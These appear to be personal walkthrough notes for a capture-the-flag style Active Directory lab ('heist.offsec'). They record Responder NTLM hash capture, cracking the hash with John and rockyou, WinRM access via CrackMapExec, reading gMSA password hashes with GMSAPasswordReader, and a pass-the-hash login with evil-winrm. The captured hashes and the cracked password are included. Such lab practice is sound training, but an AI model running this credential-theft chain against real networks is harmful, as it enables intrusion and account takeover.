-  sudo responder \-I tun0 \-dw \-v\(make sure HTTP is ON\)
-  \[HTTP\] Sending NTLM authentication request to 192\.168\.190\.165
\[HTTP\] GET request from: ::ffff:192\.168\.190\.165  URL: / 
\[HTTP\] NTLMv2 Client   : 192\.168\.190\.165
\[HTTP\] NTLMv2 Username : HEIST\\enox
\[HTTP\] NTLMv2 Hash     : enox::HEIST:3eb62e654a906794:20FE0AD48A2316C6BA22172EF6D63816:010100000000000065FACFFCC48ADA01761878F60ED371660000000002000800560044003900540001001E00570049004E002D005300340057004F0046004F00340056004800410057000400140056004400390054002E004C004F00430041004C0003003400570049004E002D005300340057004F0046004F00340056004800410057002E0056004400390054002E004C004F00430041004C000500140056004400390054002E004C004F00430041004C000800300030000000000000000000000000300000531811BEBD383AAA57993678462237FBC5A8F33E2CEA4A7AC9BB7945ABC426000A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100390039000000000000000000  

-  john enox\.hash \-\-wordlist=/usr/share/wordlists/rockyou\.txt
-  california       \(enox\)  

-  poetry run crackmapexec winrm 192\.168\.209\.165 \-u 'enox' \-p 'california'
HTTP        192\.168\.209\.165 5985   DC01             \[\+\] heist\.offsec\\enox:california \(Pwn3d\!\)

## found svc\_apache server

-  cat todo\.txt
\- Setup Flask Application for Secure Browser \[DONE\]
\- Use group managed service account for apache \[DONE\]
\- Migrate to apache
\- Debug Flask Application \[DONE\]
\- Remove Flask Application
\- Submit IT Expenses file to admin\. \[DONE\]

Get\-ADServiceAccount \-Filter \* | where\-object \{$\_\.ObjectClass \-eq "msDS\-GroupManagedServiceAccount"\}

DistinguishedName : CN=svc\_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled           : True
Name              : svc\_apache
ObjectClass       : msDS\-GroupManagedServiceAccount
ObjectGUID        : d40bc264\-0c4e\-4b86\-b3b9\-b775995ba303
SamAccountName    : svc\_apache$
SID               : S\-1\-5\-21\-537427935\-490066102\-1511301751\-1105

gMSA is enabled on svc\_apache$

-  built GMSAPasswordReader\.exe in Visual Studio -  send to victim machine

-  PS C:\\Tools\> \./GMSAPasswordReader\.exe \-\-AccountName svc\_apache
Calculating hashes for Old Value
\[\*\] Input username             : svc\_apache$
\[\*\] Input domain               : HEIST\.OFFSEC
\[\*\] Salt                       : HEIST\.OFFSECsvc\_apache$
\[\*\]       rc4\_hmac             : 4B3F0BF258E6C099A7B800EC37B2D456
\[\*\]       aes128\_cts\_hmac\_sha1 : 59B5DFDC9630BF933D8831F2AF2C9D0D
\[\*\]       aes256\_cts\_hmac\_sha1 : 04CDE4BDBB80B789FCFFB2642D9FF68B77730E28C5D55ECB432352193B10F694
\[\*\]       des\_cbc\_md5          : C87CB34C79F78A6B

Calculating hashes for Current Value
\[\*\] Input username             : svc\_apache$
\[\*\] Input domain               : HEIST\.OFFSEC
\[\*\] Salt                       : HEIST\.OFFSECsvc\_apache$
\[\*\]       rc4\_hmac             : DA55A6102C791A052798C4B7EF6C0122
\[\*\]       aes128\_cts\_hmac\_sha1 : DCDE26BFBC9DF8915B7596B53D7D68C6
\[\*\]       aes256\_cts\_hmac\_sha1 : 233516DD90F498594EAC626E2FCA92504ABB675B34ED7D5E025D1897077CAFBD
\[\*\]       des\_cbc\_md5          : 73F4133E1F385B68

-  evil\-winrm \-i heist\.offsec \-u 'svc\_apache$' \-H 'DA55A6102C791A052798C4B7EF6C0122'

